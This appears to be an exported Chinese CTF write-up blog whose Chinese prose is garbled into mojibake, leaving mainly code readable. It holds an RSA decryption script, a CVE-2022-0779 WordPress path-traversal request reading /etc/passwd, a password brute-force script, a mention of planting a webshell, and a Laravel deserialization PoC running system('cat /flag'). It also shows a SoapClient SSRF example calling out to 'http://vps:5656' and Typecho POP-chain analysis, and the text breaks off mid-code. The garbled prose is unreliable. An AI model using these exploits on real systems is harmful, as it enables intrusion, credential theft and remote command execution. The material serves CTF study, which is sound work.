<p>4ä¸ªå› å­ï¼Œå› ä¸ºéƒ½æ˜¯128ä½ï¼Œyafuç›´æ¥åˆ†è§£$\sqrt{n}$</p>
<p>è·‘åˆ°ä¸€åŠæŠ¥é”™äº†ï¼ˆå¿ƒæ€å´©ï¼‰ï¼Œçœ‹æ—¥å¿—å·®ä¸å¤šä¸€ä¸ªå°æ—¶çš„æ—¶é—´åˆ†è§£å‡ºæ¥ä¸€ä¸ªå› å­</p>
<p><img src="https://img-blog.csdnimg.cn/1f0e7c4234314af7884e51a136a61164.png" alt="image-20220730204034366"></p>
<p>ä¹‹åé‡æ–°ä¸‹è½½äº†ä¸€ä¸ªyafuå°±å¯ä»¥ç»§ç»­è·‘äº†</p>
<p><img src="https://img-blog.csdnimg.cn/0df9ba80ac344ad498a5ddbbd620dd6f.png" alt="image-20220730222756505"></p>
<p>æœ€å$e=3$ï¼Œ$\varphi$æœ‰å…¬å› å­9åˆ†åˆ«æ¥è‡ªä¸¤ä¸ªå› å­ï¼›ç”±äº$m$æ¯”è¾ƒå°ï¼Œç›´æ¥é€‰ç”¨å¦å¤–ä¸¤ä¸ªå› å­åšæ¨¡æ•°å°±å¥½äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span></span><br><span class="line">n = <span class="number">8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span></span><br><span class="line">n1 = iroot(n, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">r1, r2, r3, r4 = [<span class="number">225933944608558304529179430753170813347</span>, <span class="number">218566259296037866647273372633238739089</span>, <span class="number">223213222467584072959434495118689164399</span>, <span class="number">260594583349478633632570848336184053653</span>]</span><br><span class="line"></span><br><span class="line">phi = r3 * r4 * (r3 - <span class="number">1</span>) * (r4 - <span class="number">1</span>)</span><br><span class="line">new_n = (r3 * r4) ** <span class="number">2</span></span><br><span class="line">d = invert(e, phi)</span><br><span class="line">m = long_to_bytes(<span class="built_in">pow</span>(c, d, new_n))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;Fear_can_hold_you_prisoner_Hope_can_set_you_free&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="WP-UM"><a href="#WP-UM" class="headerlink" title="WP-UM"></a>WP-UM</h4><ul>
<li><strong>CVE-2022-0779</strong></li>
</ul>
<p>å› ä¸ºå­˜åœ¨meta-useræ’ä»¶ï¼Œå¹¶ä¸”ç‰ˆæœ¬ä¸º2.4.3</p>
<p>payload:</p>
<p><a href="https://www.zilyun.com/23036.html">WordPress User Meta Lite Pro 2.4.3 Pathéå†æ¼æ´CVE-2022-0779-å­äº‘ç¤¾åŒº (zilyun.com)</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /wp-admin/admin-ajax.php HTTP/1.1<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Accept: */*<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Accept-Language: en-GB,en;q=0.5<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Accept-Encoding: gzip, deflate<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">X-Requested-With: XMLHttpRequest<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Content-Length: 158<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Connection: close<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Cookie: [subscriber+]<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">field_name=test&amp;filepath=/../../../../../../../../etc/passwd&amp;field_id=um_field_4&amp;form_key=Upload&amp;action=um_show_uploaded_file&amp;pf_nonce=4286c1c56a&amp;is_ajax=true</span><br></pre></td></tr></table></figure>

<p>è€Œç»™æˆ‘ä»¬çš„ç›®å½•ä¸­å‘ç°å­˜åœ¨usernameå’Œpasswordç›®å½•ï¼Œè€Œé€šè¿‡é¢˜ç›®çš„æç¤ºè¯´æ˜å°±æ˜¯ç®¡ç†å‘˜çš„è´¦æˆ·ï¼Œé‚£ä¹ˆç›´æ¥åˆ©ç”¨è¿™ä¸ªcveçˆ†ç ´ç®¡ç†å‘˜å¯†ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAdmin</span>():</span></span><br><span class="line">    url = <span class="string">&#x27;&lt;http://eci-2ze10x6989phb1g6riek.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>:</span><br><span class="line">            data = &#123;<span class="string">&#x27;field_name&#x27;</span>: <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;filepath&#x27;</span>: <span class="string">&#x27;/../../../../../../password/&#123;&#125;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i), x), <span class="string">&#x27;field_id&#x27;</span>: <span class="string">&#x27;um_field_4&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;form_key&#x27;</span>: <span class="string">&#x27;Upload&#x27;</span>, <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;um_show_uploaded_file&#x27;</span>, <span class="string">&#x27;pf_nonce&#x27;</span>: <span class="string">&#x27;ffe681c469&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;is_ajax&#x27;</span>: <span class="string">&#x27;true&#x27;</span>&#125;</span><br><span class="line">            cookie = &#123;&#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;umRemoveFile&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(i)+x)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">getAdmin()</span><br><span class="line"></span><br><span class="line"><span class="comment"># MaoGePaMao</span></span><br><span class="line"><span class="comment"># MaoGeYaoQiFeiLa</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ç™»å½•ï¼Œåœ¨æ’ä»¶é‚£é‡Œå­˜åœ¨æ’ä»¶æ–‡ä»¶ç¼–è¾‘ï¼Œç›´æ¥åœ¨user-meta.phpä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬</p>
<p>ç›´æ¥è®¿é—®é¦–é¡µï¼Œæ‰§è¡ŒæˆåŠŸï¼Œflagåœ¨userç›®å½•ä¸‹</p>
]]></content>
      <categories>
        <category>å‚åŠ çš„å„ç§æ¯”èµ›</category>
      </categories>
      <tags>
        <tag>å¼ºç½‘æ¯</tag>
      </tags>
  </entry>
  <entry>
    <title>é›†è®­å­¦ä¹ è®°å½•â… </title>
    <url>/2022/07/02/%E9%9B%86%E8%AE%AD%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E2%85%A0/</url>
    <content><![CDATA[<blockquote>
<p>å®éªŒå®¤æš‘å‡é›†è®­å¼€å§‹äº†ï¼Œæ¯å¤©åˆ·ä¸ªäº†2ã€3ã€4é¢˜å§ï¼Œå­¦åˆ°çš„çŸ¥è¯†å¯èƒ½æ²¡æœ‰ç›´æ¥æ”¾åœ¨wpä¸­ï¼Œä¹‹åæ•´ç†å‡ºæ¥åº”è¯¥ä¼šä»¤å‘ä¸€ä¸ª</p>
</blockquote>
<span id="more"></span>

<h2 id="CISCN2019-Laravel1"><a href="#CISCN2019-Laravel1" class="headerlink" title="[CISCN2019]Laravel1"></a>[CISCN2019]Laravel1</h2><p>å¼€å¹•indexControllerç›´æ¥ç»™äº†ï¼Œè¿˜ç»™äº†å¤‡ä»½æºç ï¼Œé‚£å°±ç›´æ¥å®¡è®¡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//backup in source.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">\Illuminate\Http\Request <span class="variable">$request</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="variable">$request</span>-&gt;input(<span class="string">&quot;payload&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$payload</span>))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            @unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºååºåˆ—åŒ–ä¹‹åå¯¹å®ä¾‹åŒ–çš„ç±»å¹¶æ²¡æœ‰ä»»ä½•æ“ä½œï¼Œæ‰€æœ‰åªèƒ½å€šé åŸç±»çš„ä¼šè‡ªåŠ¨æ‰§è¡Œçš„é­”æœ¯æ–¹æ³•æ¥æ‰§è¡Œå°±æ¯”å¦‚<code>__destruct</code></p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220620123403997.png" alt="image-20220620123403997"></p>
<p>æ‰¾åˆ°å¯åˆ©ç”¨çš„<code>__destruct</code>ï¼š</p>
<ul>
<li>ä¸€äº›å‡½æ•°å¦‚<code>call_user_func|file_get_contents|include</code></li>
<li>å¯ä»¥è§¦å‘å…¶ä»–é­”æœ¯æ–¹æ³•æ¯”å¦‚<code>toString|call|get|set|invoke</code></li>
<li>ç›´æ¥å­˜åœ¨å¯æ“ä½œçš„<code>$fun($args)</code>ï¼Œå…¶ä¸­å‡½æ•°å’Œå‚æ•°æˆ‘ä»¬éƒ½å¯ä»¥æ“ä½œ</li>
<li>æˆ–è€…å®ä¾‹åŒ–äº†ä¸€ä¸ªç±»å¯ä»¥è§¦å‘åŸç”Ÿç±»</li>
<li>â€¦â€¦</li>
</ul>
<p>è¿™é‡Œæ‰¾åˆ°äº†<code>TagAwareAdapter::__destruct</code>ï¼Œè¿™é‡Œå­˜åœ¨<code>$f($items)</code>ç›´æ¥åˆ©ç”¨å•¦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;deferred) &#123;</span><br><span class="line">    <span class="variable">$items</span> = <span class="keyword">$this</span>-&gt;deferred;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$items</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred(<span class="variable">$item</span>)) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;deferred[<span class="variable">$key</span>]);</span><br><span class="line">            <span class="variable">$ok</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">$this</span>-&gt;getTagsByKey;</span><br><span class="line">    <span class="variable">$tagsByKey</span> = <span class="variable">$f</span>(<span class="variable">$items</span>); </span><br><span class="line">    <span class="keyword">$this</span>-&gt;deferred = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥pocï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$deferred</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$getTagsByKey</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;deferred = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;getTagsByKey = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/7af57e6fd813438eadc61569f2681d17.png" alt="image-20220620124744055"></p>
<h2 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h2><h3 id="SoapClient-SSRF"><a href="#SoapClient-SSRF" class="headerlink" title="SoapClient SSRF"></a>SoapClient SSRF</h3><p>ä¸Šä¸€ä¸ªç®€å•çš„å°æ —å­ï¼Œï¼ˆå¦‚æœæŠ¥é”™ä¸ºæœªæ‰¾åˆ°<code>SoapClient</code>ç±»ï¼Œé‚£ä¹ˆè¯·å…ˆåˆ°php.iniåŠ ä¸Šsoapçš„æ‹“å±•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;aaa&#x27;</span>, <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://vps:5656&#x27;</span>));</span><br><span class="line">    <span class="variable">$a</span>-&gt;function();</span><br><span class="line">&#125; <span class="keyword">catch</span> (SoapFault <span class="variable">$e</span>) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/f6193516b9a94ea8bcdc809659213663.png" alt="image-20220620145743286"></p>
<p>å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°æ•°æ®æˆåŠŸåœ°æ˜¾ç¤ºåœ¨äº†æˆ‘ä»¬è‡ªå·±çš„vpsä¸Š</p>
<p>å¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸ªç±»ï¼š</p>
<p>ä»æ³¨é‡Šä¸­å¯ä»¥å¾—åˆ°<code>location</code>å’Œ<code>uri</code>æ˜¯å¿…é¡»è®¾ç½®çš„</p>
<p>å…¶ä»–çš„è¿˜æœ‰<code>soap_version|proxy_host|user_agent|stream_context|keep_alive|ssl_method</code>ç­‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">* @param <span class="keyword">array</span> <span class="variable">$options</span> [optional] &lt;p&gt;</span><br><span class="line">* An <span class="keyword">array</span> of options. <span class="keyword">If</span> working in WSDL mode, this parameter is optional.</span><br><span class="line">* <span class="keyword">If</span> working in non-WSDL mode, the location <span class="keyword">and</span></span><br><span class="line">* uri options must be set, where location</span><br><span class="line">* is the URL of the SOAP server to send the request to, <span class="keyword">and</span> uri</span><br><span class="line">* is the target <span class="keyword">namespace</span> <span class="title">of</span> <span class="title">the</span> <span class="title">SOAP</span> <span class="title">service</span>.</span><br><span class="line">* &lt;/<span class="title">p</span>&gt;</span><br><span class="line">* &lt;<span class="title">p</span>&gt;</span><br><span class="line">* <span class="title">The</span> <span class="title">style</span> <span class="title">and</span> <span class="title">use</span> <span class="title">options</span> <span class="title">only</span> <span class="title">work</span> <span class="title">in</span></span><br><span class="line">* <span class="title">non</span>-<span class="title">WSDL</span> <span class="title">mode</span>. <span class="title">In</span> <span class="title">WSDL</span> <span class="title">mode</span>, <span class="title">they</span> <span class="title">come</span> <span class="title">from</span> <span class="title">the</span> <span class="title">WSDL</span> <span class="title">file</span>.</span><br><span class="line">* &lt;/<span class="title">p</span>&gt;</span><br><span class="line">* &lt;<span class="title">p</span>&gt;</span><br><span class="line">* <span class="title">The</span> <span class="title">soap_version</span> <span class="title">option</span> <span class="title">should</span> <span class="title">be</span> <span class="title">one</span> <span class="title">of</span> <span class="title">either</span></span><br><span class="line">* &lt;<span class="title">b</span>&gt;<span class="title">SOAP_1_1</span>&lt;/<span class="title">b</span>&gt; <span class="title">or</span> &lt;<span class="title">b</span>&gt;<span class="title">SOAP_1_2</span>&lt;/<span class="title">b</span>&gt; <span class="title">to</span></span><br><span class="line">* <span class="title">select</span> <span class="title">SOAP</span> 1.1 <span class="title">or</span> 1.2, <span class="title">respectively</span>. <span class="title">If</span> <span class="title">omitted</span>, 1.1 <span class="title">is</span> <span class="title">used</span>.</span><br><span class="line">* &lt;/<span class="title">p</span>&gt;</span><br><span class="line">* â€¦â€¦</span><br><span class="line">â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure>

<h3 id="åšé¢˜"><a href="#åšé¢˜" class="headerlink" title="åšé¢˜"></a>åšé¢˜</h3><p>é¦–å…ˆå¼„ä¸‹æºç ä¹‹åé™¤äº†index.phpä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªflag.phpæ ¼å¤–å¼•äººæ³¨ç›®ï¼Œå¹¶ä¸”è¦æ±‚è®¿é—®æ¥æºåœ°å€ä¸º<code>127.0.0.1</code>ç„¶åå°†flagæ”¾å…¥session</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>]= <span class="string">&quot;MRCTF&#123;******&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;æˆ‘æ‰Œyour problem?\nonly localhost can get flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥åœ¨<code>usr/plugins/HelloWorld</code>ä¸­å‘ç°æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ä¸»è¦ä»£ç ï¼Œæˆ‘ä»¬å°±è¦å‘ç°å¦‚æœè¿™é‡Œé€šè¿‡ä»»æ„æ–¹æ³•è¯·æ±‚<code>admin</code>ï¼Œé‚£ä¹ˆå°±ä¼šæŠŠsessionè¾“å‡ºï¼Œè€Œå¦‚æœæˆ‘ä»¬æˆåŠŸè®¿é—®<code>flag.php</code>å°±å¯ä»¥å¾—åˆ°åœ¨æœ¬é¡µé¢å¾—åˆ°flagäº†ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) session_start();</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;admin&#x27;</span>])) var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/file|assert|eval|[`\&#x27;~^?&lt;&gt;$%]+/i&quot;</span>,base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) === <span class="number">0</span>)</span><br><span class="line">   unserialize(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;C0incid3nc3&#x27;</span>]));</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Not that easy.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆç°åœ¨é¦–è¦çš„é‡ç‚¹æ˜¯ï¼Œè¯¥æ€ä¹ˆè¿›å»è¿™ä¸ªè·¯ç”±</p>
<p>åœ¨<code>var/Typecho/Plugin.php</code>ä¸­å‘ç°äº†è¯¥æ’ä»¶çš„è·¯ç”±</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span>(<span class="params"><span class="variable">$pluginName</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$_plugins</span>[<span class="string">&#x27;activated&#x27;</span>][<span class="variable">$pluginName</span>] = <span class="built_in">self</span>::<span class="variable">$_tmp</span>;</span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$_tmp</span> = <span class="keyword">array</span>();</span><br><span class="line">    Helper::addRoute(<span class="string">&quot;page_admin_action&quot;</span>,<span class="string">&quot;/page_admin&quot;</span>,<span class="string">&quot;HelloWorld_Plugin&quot;</span>,<span class="string">&#x27;action&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæ¥ä¸‹å»å°±æ˜¯æ‰¾popé“¾äº†</p>
<p>é¦–å…ˆå¯ä»¥å…ˆå»æ‰¾ä¸€ä¸‹<code>__destruct</code>ï¼Œä½†æ˜¯å‘ç°åªæœ‰ä¸¤ä¸ªç±»ä¸­å­˜åœ¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ä¸”æ²¡æœ‰ä¸€ç‚¹ç”¨ï¼Œæ‰€ä»¥å¾—æ‰¾åˆ«çš„è·¯äº†</p>
<p>ç„¶åæˆ‘ä»¬å¯ä»¥å‘ç°åŒä¸ªæ–‡ä»¶ä¸‹è¿˜æœ‰ä¸€ä¸ª<code>HelloWorld_DB</code>ç±»ï¼Œå®ƒå­˜åœ¨<code>wakeup</code>æ–¹æ³•ï¼Œä¼šåœ¨ååºåˆ—åŒ–ä¹‹å‰è‡ªåŠ¨è°ƒç”¨ï¼Œå®ä¾‹åŒ–äº†<code>Typecho_Db</code>è€Œä¸”ä¼ å…¥çš„å‚æ•°æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥å…ˆä»è¿™ä¸ªå…¥æ‰‹</p>
<p><code>Typecho_Db::__construct</code>å­—ç¬¦è¿æ¥è§¦å‘<code>toString</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$adapterName</span>, <span class="variable">$prefix</span> = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** è·å–é€‚é…å™¨åç§° */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_adapterName = <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** æ•°æ®åº“é€‚é…å™¨ */</span></span><br><span class="line">    <span class="variable">$adapterName</span> = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . <span class="variable">$adapterName</span>; <span class="comment">// è§¦å‘toString</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>(<span class="variable">$adapterName</span>, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);<span class="comment">//__toString()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_prefix = <span class="variable">$prefix</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** åˆå§‹åŒ–å†…éƒ¨å˜é‡ */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å®ä¾‹åŒ–é€‚é…å™¨å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> <span class="variable">$adapterName</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°åªæœ‰ä¸€ä¸ªå¯èƒ½å¯ä»¥åˆ©ç”¨çš„<code>Typecho_Db_Query::__toString</code>ï¼Œä¼šæ ¹æ®<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>çš„å€¼æ¥æ‰§è¡Œä¸åŒçš„æ–¹æ³•ï¼Œè¿™é‡Œæ¯”è¾ƒç®€å•çš„å°±<code>SELECT</code>å¯¹åº”çš„<code>$this-&gt;_adapter</code>æ˜¯ä¸€ä¸ªç±»ï¼Œè°ƒç”¨äº†æ–¹æ³•ï¼Œè¿™é‡Œå¯ä»¥è§¦å‘<code>call</code>æ–¹æ³•ï¼Œå†ç»“åˆå‰é¢å¾—åˆ°flagçš„è¦æ±‚ï¼Œå¯ä»¥æƒ³åˆ°åŸç”Ÿç±»ä¸­<code>SoapClient</code>çš„callæ–¹æ³•å¯ä»¥å®ç°<code>SSRF</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">            . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">            . <span class="string">&#x27; VALUES &#x27;</span></span><br><span class="line">            . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;DELETE FROM &#x27;</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">            <span class="variable">$columns</span> = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span 